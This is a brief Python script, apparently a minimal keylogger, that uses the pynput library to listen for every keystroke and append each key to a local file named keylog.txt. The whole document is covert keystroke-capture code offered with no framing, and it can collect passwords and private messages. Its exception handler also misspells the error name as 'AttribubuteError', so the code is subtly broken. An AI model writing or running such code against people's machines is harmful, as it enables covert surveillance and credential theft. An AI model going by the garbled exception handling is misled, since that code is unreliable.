from pynput import keyboard

def on_press(key):
    try:
         with open("keylog.txt", "a") as f:
             f.write('{0} pressed\n'.format(key.char))
    except AttribubuteError:
        with open("keylog.txt", "a") as f:
          f.write('{0} pressed\n'.format(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
